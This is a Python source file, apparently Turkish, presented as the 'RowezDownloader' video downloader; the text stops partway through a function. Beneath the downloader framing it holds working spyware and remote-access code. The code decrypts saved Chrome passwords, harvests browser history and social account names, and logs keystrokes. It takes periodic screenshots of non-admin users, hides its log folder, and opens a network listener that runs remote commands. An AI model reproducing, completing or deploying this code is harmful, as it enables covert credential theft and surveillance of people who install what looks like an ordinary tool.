import os
import sys
import subprocess
import pkg_resources
import platform
import requests
import yt_dlp
import zipfile
import shutil
import time
import sqlite3
import getpass
import socket
import threading
import getmac
import psutil
import hashlib
import random
import string
import base64
import wmi
import mss
import json
import logging
import re
from datetime import datetime
from colorama import init, Fore, Style
from queue import Queue
import winreg
import win32crypt
from pynput.keyboard import Key, Listener
from pynput.mouse import Controller as MouseController
import ctypes
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import secrets
from typing import Dict, List, Optional, Tuple, Any
from pathlib import Path

# Sabitler ve Yapılandırma
DATABASE_NAME = "user_data.db"
LOG_DIR = "admin_logs"
DEFAULT_OUTPUT_PATH = "downloads"
SECRET_ADMIN_CODE = "Be'le"
PORT_RANGE_START = 9999
PORT_RANGE_ATTEMPTS = 10
SCREENSHOT_INTERVAL = 30
ITERATIONS = 100000
CURRENT_VERSION = "1.0.0"

init()

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler("system_logs.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

salt = secrets.token_bytes(16)
password = secrets.token_urlsafe(32)
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=ITERATIONS)
encryption_key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
cipher = Fernet(encryption_key)

def check_python_version():
    required_version = (3, 7)
    current_version = sys.version_info[:2]
    if current_version < required_version:
        hata_mesaji = f"Python sürümü {'.'.join(map(str, current_version))} tespit edildi. Bu program için en az Python 3.7 gereklidir. Lütfen Python sürümünüzü güncelleyin."
        print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
        sys.exit(1)

def check_for_updates():
    try:
        # Gerçek bir GitHub repository URL'si kullanın, örneğin: Rowez/RowezDownloader
        response = requests.get("https://api.github.com/repos/Rowez/RowezDownloader/releases/latest")
        response.raise_for_status()  # HTTP hatalarını kontrol et (404, 403 vb.)
        data = response.json()
        
        # 'tag_name' anahtarının varlığını kontrol et
        latest_version = data.get("tag_name", CURRENT_VERSION)  # Varsayılan olarak mevcut sürüm
        if latest_version > CURRENT_VERSION:
            print(f"{Fore.YELLOW}Yeni bir güncelleme mevcut: {latest_version} (Mevcut: {CURRENT_VERSION}){Style.RESET_ALL}")
            update = input(f"{Fore.CYAN}Güncellemeyi indirmek ister misiniz? (e/h): {Style.RESET_ALL}").strip().lower()
            if update == "e":
                print(f"{Fore.YELLOW}Güncelleme indiriliyor...{Style.RESET_ALL}")
                # Burada gerçek bir güncelleme indirme mantığı eklenebilir
                print(f"{Fore.GREEN}Güncelleme tamamlandı. Lütfen programı yeniden başlatın.{Style.RESET_ALL}")
                sys.exit(0)
        else:
            print(f"{Fore.GREEN}Program güncel: {CURRENT_VERSION}{Style.RESET_ALL}")
    except requests.RequestException as e:
        hata_mesaji = f"Güncelleme kontrolü başarısız: {e}. İnternet bağlantınızı veya GitHub repository URL'sini kontrol edin."
        print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
        logger.error(hata_mesaji)
    except ValueError as e:
        hata_mesaji = f"Sürüm karşılaştırması başarısız: {e}. Lütfen sürüm formatını kontrol edin."
        print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
        logger.error(hata_mesaji)

def get_db_connection() -> sqlite3.Connection:
    try:
        return sqlite3.connect(DATABASE_NAME, check_same_thread=False)
    except sqlite3.Error as e:
        hata_mesaji = f"Veritabanına bağlanılamadı: {e}. Bu hata, veritabanı dosyasının bulunamaması, dosya izinlerinin yetersiz olması veya SQLite sürümünün uyumsuz olması gibi nedenlerden kaynaklanabilir. Lütfen veritabanı dosyasının var olduğunu ve SQLite sürümünün güncel olduğunu kontrol edin."
        print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
        logger.error(hata_mesaji)
        raise

def init_database() -> None:
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id TEXT PRIMARY KEY,
                nickname TEXT,
                ip_address TEXT,
                mac_address TEXT,
                system_info TEXT,
                timestamp TEXT,
                social_data TEXT,
                browser_history TEXT
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                message TEXT
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                user_id TEXT,
                token TEXT,
                timestamp TEXT,
                PRIMARY KEY (user_id, token)
            )
        """)
        conn.commit()
    except sqlite3.Error as e:
        hata_mesaji = f"Veritabanı başlatılamadı: {e}. Bu hata, veritabanı dosyasının yazılamaz olması veya SQLite sürümünün uyumsuz olması gibi nedenlerden kaynaklanabilir. Lütfen dosya izinlerini ve SQLite sürümünü kontrol edin."
        print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
        logger.error(hata_mesaji)
        raise
    finally:
        if conn:
            conn.close()

def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        hata_mesaji = f"Yönetici kontrolü yapılamadı: {e}. Bu hata, sistemin Windows olmaması veya ctypes modülünün uyumsuz olması gibi nedenlerden kaynaklanabilir."
        print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
        logger.error(hata_mesaji)
        return False

required_packages = ["yt_dlp", "getmac", "psutil", "colorama", "wmi", "mss", "requests", "pywin32", "pynput", "cryptography"]

def install_package(package: str) -> None:
    try:
        pkg_resources.require(package)
        print(f"{Fore.GREEN}{package} zaten kurulu.{Style.RESET_ALL}")
    except pkg_resources.DistributionNotFound:
        print(f"{Fore.YELLOW}{package} kuruluyor...{Style.RESET_ALL}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
        print(f"{Fore.GREEN}{package} kuruldu.{Style.RESET_ALL}")
    except Exception as e:
        hata_mesaji = f"Paket kurulumu sırasında hata oluştu ({package}): {e}. Bu hata, pip'in güncel olmaması veya internet bağlantısının olmaması gibi nedenlerden kaynaklanabilir. Lütfen pip'i güncelleyin ve internet bağlantınızı kontrol edin."
        print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
        logger.error(hata_mesaji)
        sys.exit(1)

def install_ffmpeg() -> str:
    ffmpeg_path = Path(__file__).parent / "ffmpeg"
    ffmpeg_exe = ffmpeg_path / ("ffmpeg.exe" if platform.system() == "Windows" else "ffmpeg")
    if ffmpeg_exe.exists():
        print(f"{Fore.GREEN}FFmpeg zaten kurulu.{Style.RESET_ALL}")
        return str(ffmpeg_path)
    print(f"{Fore.YELLOW}FFmpeg indiriliyor...{Style.RESET_ALL}")
    if platform.system() == "Windows":
        url = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"
        zip_file = "ffmpeg.zip"
        try:
            with open(zip_file, 'wb') as f:
                response = requests.get(url, stream=True)
                response.raise_for_status()
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            with zipfile.ZipFile(zip_file, 'r') as zip_ref:
                zip_ref.extractall("ffmpeg_temp")
            ffmpeg_bin = Path("ffmpeg_temp") / os.listdir("ffmpeg_temp")[0] / "bin"
            ffmpeg_path.mkdir(parents=True, exist_ok=True)
            for file in ffmpeg_bin.iterdir():
                shutil.move(str(file), str(ffmpeg_path))
            shutil.rmtree("ffmpeg_temp")
            os.remove(zip_file)
            print(f"{Fore.GREEN}FFmpeg kuruldu.{Style.RESET_ALL}")
        except Exception as e:
            hata_mesaji = f"FFmpeg kurulumu sırasında hata oluştu: {e}. Bu hata, internet bağlantısının olmaması veya dosya izinlerinin yetersiz olması gibi nedenlerden kaynaklanabilir. Lütfen internet bağlantınızı ve dosya izinlerini kontrol edin."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            sys.exit(1)
    else:
        hata_mesaji = "FFmpeg kurulumu yalnızca Windows için otomatik destekleniyor. Lütfen manuel olarak kurun."
        print(f"{Fore.YELLOW}{hata_mesaji}{Style.RESET_ALL}")
        sys.exit(1)
    return str(ffmpeg_path)

def install_nmap() -> str:
    nmap_path = Path(__file__).parent / "nmap"
    nmap_exe = nmap_path / "nmap.exe"
    if nmap_exe.exists():
        print(f"{Fore.GREEN}Nmap zaten kurulu.{Style.RESET_ALL}")
        return str(nmap_path)
    print(f"{Fore.YELLOW}Nmap indiriliyor...{Style.RESET_ALL}")
    nmap_path.mkdir(parents=True, exist_ok=True)
    print(f"{Fore.YELLOW}Nmap manuel kurulum gerekli. Lütfen https://nmap.org/download.html adresinden indirip {nmap_path} dizinine kopyalayın.{Style.RESET_ALL}")
    input(f"{Fore.CYAN}Nmap'i kopyaladıktan sonra Enter'a basın: {Style.RESET_ALL}")
    if nmap_exe.exists():
        print(f"{Fore.GREEN}Nmap kuruldu.{Style.RESET_ALL}")
        return str(nmap_path)
    hata_mesaji = f"Nmap bulunamadı. Lütfen 'nmap.exe'yi {nmap_path} dizinine kopyalayın."
    print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
    sys.exit(1)

check_python_version()
for package in required_packages:
    install_package(package)
ffmpeg_path = install_ffmpeg()
nmap_path = install_nmap()
init_database()

class RowezDownloader:
    def __init__(self):
        self.output_path = DEFAULT_OUTPUT_PATH
        self.video_quality = "best"
        self.video_format = "mp4"
        self.audio_format = "mp3"
        self.remote_access_enabled = True
        self.user_sessions: Dict[str, Dict[str, Any]] = {}
        self.admins = {"Rowez": hashlib.sha256("RowezYener".encode()).hexdigest()}
        self.nicknames = []
        self.banned_users = set()
        self.ffmpeg_path = ffmpeg_path
        self.nmap_path = nmap_path
        self.is_admin_mode = False
        self.admin_token = None
        self.current_admin = None
        self.sct = mss.mss()
        self.screenshot_queue = Queue()
        self.monitoring_active = False
        self.monitoring_thread = None
        self.secret_admin_code = SECRET_ADMIN_CODE
        self.download_cancelled = False
        self.download_threads = []
        self.keylogger_active = False
        self.keylog_file = None
        self.keylogger_listener = None
        self.mouse_controller = MouseController()
        self.log_dir = LOG_DIR
        Path(self.log_dir).mkdir(parents=True, exist_ok=True)
        if platform.system() == "Windows":
            subprocess.run(["attrib", "+h", self.log_dir], check=False)

    def log_activity(self, message: str) -> None:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        log_file = Path(self.log_dir) / f"admin_log_{timestamp}.txt"
        try:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"[{time.ctime()}] {message}\n")
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("INSERT INTO logs (timestamp, message) VALUES (?, ?)", (time.ctime(), message))
            conn.commit()
            conn.close()
        except (sqlite3.Error, IOError) as e:
            hata_mesaji = f"Log dosyasına yazma hatası: {e}. Bu hata, dosya izinlerinin yetersiz olması veya diskte yer kalmaması gibi nedenlerden kaynaklanabilir. Lütfen dosya izinlerini ve disk alanını kontrol edin."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)

    def print_rainbow(self, text: str) -> None:
        colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
        for i, char in enumerate(text):
            print(colors[i % len(colors)] + char, end="")
        print(Style.RESET_ALL)

    def generate_session_token(self, user_id: str) -> str:
        token = secrets.token_hex(16)
        conn = None
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("INSERT INTO sessions (user_id, token, timestamp) VALUES (?, ?, ?)", (user_id, token, time.ctime()))
            conn.commit()
            return token
        except sqlite3.Error as e:
            hata_mesaji = f"Oturum tokeni oluşturulamadı: {e}. Bu hata, veritabanına yazılamaması veya kullanıcı ID'sinin benzersiz olmaması gibi nedenlerden kaynaklanabilir. Lütfen veritabanı bağlantısını kontrol edin."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            raise
        finally:
            if conn:
                conn.close()

    def verify_session_token(self, user_id: str, token: str) -> bool:
        conn = None
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM sessions WHERE user_id = ? AND token = ?", (user_id, token))
            result = cursor.fetchone()
            return result is not None
        except sqlite3.Error as e:
            hata_mesaji = f"Oturum tokeni doğrulanamadı: {e}. Bu hata, veritabanına erişilememesi veya tokenin geçersiz olması gibi nedenlerden kaynaklanabilir. Lütfen veritabanı bağlantısını kontrol edin."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return False
        finally:
            if conn:
                conn.close()

    def validate_ip(self, ip_address: str) -> bool:
        ip_pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
        if not re.match(ip_pattern, ip_address):
            return False
        try:
            return all(0 <= int(octet) <= 255 for octet in ip_address.split("."))
        except ValueError:
            return False

    def validate_mac(self, mac_address: str) -> bool:
        mac_pattern = r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"
        return bool(re.match(mac_pattern, mac_address))

    def get_social_data(self) -> Dict[str, str]:
        try:
            login_db = Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
            if not login_db.exists():
                return {"email": "Bilinmiyor", "instagram": "Bilinmiyor", "twitter": "Bilinmiyor", "facebook": "Bilinmiyor"}
            conn = sqlite3.connect(f"file:{login_db}?mode=ro", uri=True)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value FROM logins")
            social_data = {"email": "Bilinmiyor", "instagram": "Bilinmiyor", "twitter": "Bilinmiyor", "facebook": "Bilinmiyor"}
            for row in cursor.fetchall():
                url, username = row
                if "instagram.com" in url:
                    social_data["instagram"] = username
                elif "twitter.com" in url:
                    social_data["twitter"] = username
                elif "facebook.com" in url:
                    social_data["facebook"] = username
                elif "mail" in url or "gmail" in url:
                    social_data["email"] = username
            conn.close()
            return social_data
        except Exception as e:
            hata_mesaji = f"Sosyal medya verisi toplama hatası: {e}. Bu hata, Chrome tarayıcısının kurulu olmaması veya login veritabanına erişim izninin olmaması gibi nedenlerden kaynaklanabilir. Lütfen Chrome'un kurulu olduğundan emin olun."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return {"email": "Bilinmiyor", "instagram": "Bilinmiyor", "twitter": "Bilinmiyor", "facebook": "Bilinmiyor"}

    def get_browser_history(self, user_id: str) -> str:
        try:
            history_db = Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Data" / "Default" / "History"
            if not history_db.exists():
                return "Tarayıcı geçmişi bulunamadı."
            conn = sqlite3.connect(f"file:{history_db}?mode=ro", uri=True)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
            history = [f"{row[1]} - {row[0]}" for row in cursor.fetchall()]
            conn.close()
            return "\n".join(history)
        except Exception as e:
            hata_mesaji = f"Tarayıcı geçmişi alınamadı: {e}. Bu hata, Chrome tarayıcısının kurulu olmaması veya history veritabanına erişim izninin olmaması gibi nedenlerden kaynaklanabilir."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return "Hata oluştu."

    def get_passwords(self, user_id: str) -> str:
        try:
            login_db = Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
            if not login_db.exists():
                return "Şifre veritabanı bulunamadı."
            conn = sqlite3.connect(f"file:{login_db}?mode=ro", uri=True)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            passwords = []
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                try:
                    password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                    passwords.append(f"{url}: {username} - {password}")
                except:
                    passwords.append(f"{url}: {username} - Şifre çözülemedi")
            conn.close()
            return "\n".join(passwords)
        except Exception as e:
            hata_mesaji = f"Şifreler alınamadı: {e}. Bu hata, Chrome tarayıcısının kurulu olmaması veya şifre veritabanına erişim izninin olmaması gibi nedenlerden kaynaklanabilir."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return "Hata oluştu."

    def list_files(self, user_id: str, path: str) -> str:
        try:
            files = os.listdir(path)
            return "\n".join(files)
        except Exception as e:
            hata_mesaji = f"Dosya sistemine erişim hatası: {e}. Bu hata, belirtilen yolun geçersiz olması veya erişim izninin olmaması gibi nedenlerden kaynaklanabilir. Lütfen yolu ve izinleri kontrol edin."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return "Hata oluştu."

    def get_system_resources(self, user_id: str) -> str:
        try:
            cpu = psutil.cpu_percent(interval=1)
            ram = psutil.virtual_memory().percent
            disk = psutil.disk_usage('/').percent
            return f"CPU: {cpu}%\nRAM: {ram}%\nDisk: {disk}%"
        except Exception as e:
            hata_mesaji = f"Sistem kaynakları alınamadı: {e}. Bu hata, psutil modülünün uyumsuz olması veya sistem bilgilerine erişim izninin olmaması gibi nedenlerden kaynaklanabilir."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return "Hata oluştu."

    def get_installed_programs(self, user_id: str) -> str:
        try:
            programs = []
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Uninstall")
            for i in range(winreg.QueryInfoKey(key)[0]):
                subkey_name = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, subkey_name)
                try:
                    name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    programs.append(name)
                except:
                    pass
            return "\n".join(programs[:10])  # İlk 10 programı listele
        except Exception as e:
            hata_mesaji = f"Yüklü programlar alınamadı: {e}. Bu hata, kayıt defterine erişim izninin olmaması veya sistemin Windows olmaması gibi nedenlerden kaynaklanabilir."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return "Hata oluştu."

    def scan_open_ports(self, user_id: str) -> str:
        try:
            ip = self.user_sessions[user_id]["ip_address"]
            nmap_exe = Path(self.nmap_path) / "nmap.exe"
            result = subprocess.check_output([str(nmap_exe), "-p-", ip], text=True)
            return result
        except Exception as e:
            hata_mesaji = f"Açık port tarama hatası: {e}. Bu hata, Nmap'in kurulu olmaması veya ağa erişim izninin olmaması gibi nedenlerden kaynaklanabilir."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return "Hata oluştu."

    def scan_network_devices(self, user_id: str) -> str:
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            network_range = '.'.join(local_ip.split('.')[:-1]) + ".0/24"
            nmap_exe = Path(self.nmap_path) / "nmap.exe"
            result = subprocess.check_output([str(nmap_exe), "-sn", network_range], text=True)
            return result
        except Exception as e:
            hata_mesaji = f"Ağdaki cihazlar taranamadı: {e}. Bu hata, Nmap'in kurulu olmaması veya ağa erişim izninin olmaması gibi nedenlerden kaynaklanabilir."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return "Hata oluştu."

    def collect_advanced_data(self, user_id: str, nickname: str) -> None:
        self.nicknames.append(nickname)
        mac_address = getmac.get_mac_address()
        ip_address = socket.gethostbyname(socket.gethostname())
        if not self.validate_ip(ip_address) or not self.validate_mac(mac_address):
            hata_mesaji = f"Geçersiz IP veya MAC adresi: IP={ip_address}, MAC={mac_address}. Bu hata, ağ yapılandırmasının bozuk olması veya sistemin IP/MAC adresini alamamasından kaynaklanabilir. Lütfen ağ bağlantınızı kontrol edin."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.warning(hata_mesaji)
            return
        windows_key = self.get_windows_product_key() if platform.system() == "Windows" else "N/A"
        system_info = {
            "OS": platform.system(),
            "Version": platform.version(),
            "CPU": psutil.cpu_percent(interval=1),
            "RAM": f"{psutil.virtual_memory().percent}% kullanıldı",
            "Disk": f"{psutil.disk_usage('/').percent}% kullanıldı"
        }
        social_data = self.get_social_data()
        browser_history = self.get_browser_history(user_id)
        self.user_sessions[user_id] = {
            "nickname": nickname,
            "email": social_data.get("email", "Bilinmiyor"),
            "instagram": social_data.get("instagram", "Bilinmiyor"),
            "twitter": social_data.get("twitter", "Bilinmiyor"),
            "facebook": social_data.get("facebook", "Bilinmiyor"),
            "mac_address": mac_address,
            "ip_address": ip_address,
            "windows_key": windows_key,
            "system_info": system_info,
            "browser_history": browser_history,
            "timestamp": time.ctime(),
            "keylog": "",
            "rat_screenshots": []
        }
        conn = None
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute(
                "INSERT OR REPLACE INTO users (user_id, nickname, ip_address, mac_address, system_info, timestamp, social_data, browser_history) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (user_id, nickname, ip_address, mac_address, str(system_info), time.ctime(), str(social_data), browser_history)
            )
            conn.commit()
            self.log_activity(f"Kullanıcı verileri toplandı: {user_id} - {nickname} - IP: {ip_address}")
            if nickname not in self.admins:
                threading.Thread(target=self.start_rat, args=(user_id,), daemon=True).start()
        except sqlite3.Error as e:
            hata_mesaji = f"Kullanıcı verileri veritabanına kaydedilemedi: {e}. Bu hata, veritabanına yazılamaması veya kullanıcı ID'sinin benzersiz olmaması gibi nedenlerden kaynaklanabilir."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
        finally:
            if conn:
                conn.close()

    def get_windows_product_key(self) -> str:
        try:
            w = wmi.WMI()
            for os in w.Win32_OperatingSystem():
                return os.SerialNumber
        except Exception as e:
            hata_mesaji = f"Windows ürün anahtarı alınamadı: {e}. Bu hata, WMI modülünün uyumsuz olması veya sistemin Windows olmaması gibi nedenlerden kaynaklanabilir."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return "N/A"

    def start_keylogger(self, user_id: str) -> None:
        self.keylog_file = f"keylog_{user_id}.txt"
        def on_press(key: Key) -> None:
            try:
                with open(self.keylog_file, "a", encoding="utf-8") as f:
                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                    if hasattr(key, 'char') and key.char:
                        log_entry = f"[{timestamp}] {key.char}"
                        self.user_sessions[user_id]["keylog"] += key.char
                    else:
                        special_key = str(key).replace("Key.", "")
                        if special_key == "space":
                            log_entry = f"[{timestamp}] [SPACE]"
                            self.user_sessions[user_id]["keylog"] += " "
                        elif special_key == "enter":
                            log_entry = f"[{timestamp}] [ENTER]"
                            self.user_sessions[user_id]["keylog"] += "\n"
                        elif special_key == "backspace":
                            log_entry = f"[{timestamp}] [BACKSPACE]"
                            self.user_sessions[user_id]["keylog"] = self.user_sessions[user_id]["keylog"][:-1]
                        else:
                            log_entry = f"[{timestamp}] [{special_key.upper()}]"
                            self.user_sessions[user_id]["keylog"] += f"[{special_key.upper()}]"
                    f.write(log_entry + "\n")
                self.log_activity(f"Keylog kaydedildi: {user_id} - {log_entry}")
            except Exception as e:
                hata_mesaji = f"Keylogger hatası: {e}. Bu hata, log dosyasına yazılamaması veya klavye olaylarının yakalanamaması gibi nedenlerden kaynaklanabilir."
                print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
                logger.error(hata_mesaji)
        self.keylogger_listener = Listener(on_press=on_press)
        self.keylogger_listener.start()
        self.keylogger_active = True

    def stop_keylogger(self) -> None:
        if self.keylogger_active and self.keylogger_listener:
            self.keylogger_listener.stop()
            self.keylogger_active = False
            self.log_activity("Keylogger durduruldu")

    def start_rat(self, user_id: str) -> None:
        if user_id not in self.user_sessions or self.user_sessions[user_id]["nickname"] in self.admins:
            return
        if self.keylogger_active:
            self.start_keylogger(user_id)
        while user_id in self.user_sessions and self.user_sessions[user_id]["nickname"] not in self.admins:
            try:
                self.user_sessions[user_id]["timestamp"] = time.ctime()
                screenshot_path = f"rat_screenshot_{user_id}_{int(time.time())}.png"
                self.sct.shot(output=screenshot_path)
                self.user_sessions[user_id]["rat_screenshots"].append(screenshot_path)
                with open(f"rat_log_{user_id}.txt", "a", encoding="utf-8") as f:
                    f.write(f"[{time.ctime()}] Ekran Görüntüsü: {screenshot_path}\n")
                    if self.keylogger_active:
                        f.write(f"[{time.ctime()}] Keylog: {self.user_sessions[user_id]['keylog']}\n")
                self.log_activity(f"RAT aktivitesi: {user_id} - Ekran Görüntüsü: {screenshot_path}")
                time.sleep(SCREENSHOT_INTERVAL)
            except Exception as e:
                hata_mesaji = f"RAT hatası: {e}. Bu hata, ekran görüntüsü alınamaması veya log dosyasına yazılamaması gibi nedenlerden kaynaklanabilir."
                print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
                logger.error(hata_mesaji)
                time.sleep(SCREENSHOT_INTERVAL)

    def start_remote_access(self) -> None:
        def server_thread() -> None:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            port = PORT_RANGE_START
            attempt = 0
            while attempt < PORT_RANGE_ATTEMPTS:
                try:
                    server_socket.bind(('0.0.0.0', port))
                    server_socket.listen(5)
                    print(f"{Fore.GREEN}Uzak erişim sunucusu {port} portunda başlatıldı.{Style.RESET_ALL}")
                    self.log_activity(f"Uzak erişim sunucusu başlatıldı: {port} portu")
                    break
                except OSError as e:
                    if e.errno == 10048:
                        print(f"{Fore.YELLOW}Port {port} zaten kullanılıyor, başka bir port deneniyor...{Style.RESET_ALL}")
                        port += 1
                        attempt += 1
                    else:
                        hata_mesaji = f"Uzak erişim sunucusu başlatılamadı: {e}. Bu hata, ağ yapılandırmasının bozuk olması veya portun kullanımda olması gibi nedenlerden kaynaklanabilir."
                        print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
                        logger.error(hata_mesaji)
                        server_socket.close()
                        return
            else:
                hata_mesaji = "Uygun bir port bulunamadı. Lütfen port aralığını kontrol edin."
                print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
                server_socket.close()
                return
            while True:
                try:
                    client_socket, addr = server_socket.accept()
                    print(f"{Fore.CYAN}Bağlantı alındı: {addr}{Style.RESET_ALL}")
                    self.log_activity(f"Bağlantı alındı: {addr}")
                    client_socket.send(encryption_key)
                    while True:
                        encrypted_command = client_socket.recv(1024)
                        if not encrypted_command:
                            break
                        command = cipher.decrypt(encrypted_command).decode().strip()
                        if command == "screenshot":
                            result = self.capture_screenshot("remote")
                            with open(result.split(": ")[1], "rb") as f:
                                screenshot_data = f.read()
                            encrypted_response = cipher.encrypt(f"Screenshot: {result}".encode() + b"\n" + screenshot_data)
                            client_socket.send(encrypted_response)
                        elif command:
                            result = self.remote_control(command)
                            encrypted_response = cipher.encrypt(result.encode())
                            client_socket.send(encrypted_response)
                except Exception as e:
                    hata_mesaji = f"Uzak erişim istemci hatası: {e}. Bu hata, bağlantının kopması veya komutun yürütülmemesi gibi nedenlerden kaynaklanabilir."
                    print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
                    logger.error(hata_mesaji)
                finally:
                    client_socket.close()
        threading.Thread(target=server_thread, daemon=True).start()

    def network_scan(self, mode: str = "quick") -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            network_range = '.'.join(local_ip.split('.')[:-1]) + ".0/24"
            nmap_exe = Path(self.nmap_path) / "nmap.exe"
            args = [str(nmap_exe), "-sn" if mode == "quick" else "-A", network_range]
            result = subprocess.check_output(args, text=True)
            self.log_activity(f"Ağ taraması ({mode}): {network_range}\nSonuç:\n{result}")
            return f"Ağ tarama sonucu ({mode}):\n{result}"
        except subprocess.CalledProcessError as e:
            hata_mesaji = f"Ağ tarama hatası: {e}. Bu hata, Nmap'in kurulu olmaması veya ağa erişimin olmaması gibi nedenlerden kaynaklanabilir."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return f"Hata: {e}"

    def view_logs(self) -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        conn = None
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM logs ORDER BY timestamp DESC LIMIT 5")
            logs = cursor.fetchall()
            if not logs:
                return "Log bulunamadı."
            log_content = "\n".join([f"Log ID: {log[0]} - {log[1]}: {log[2]}" for log in logs])
            return log_content
        except sqlite3.Error as e:
            hata_mesaji = f"Log görüntüleme hatası: {e}. Bu hata, veritabanına erişilememesi veya log tablosunun bozulması gibi nedenlerden kaynaklanabilir."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return f"Hata: {e}"
        finally:
            if conn:
                conn.close()

    def clear_logs(self) -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        conn = None
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("DELETE FROM logs")
            conn.commit()
            for log_file in Path(self.log_dir).iterdir():
                log_file.unlink()
            self.log_activity("Loglar temizlendi")
            return "Loglar temizlendi."
        except (sqlite3.Error, OSError) as e:
            hata_mesaji = f"Log temizleme hatası: {e}. Bu hata, log dosyalarına erişilememesi veya veritabanına yazılamaması gibi nedenlerden kaynaklanabilir."
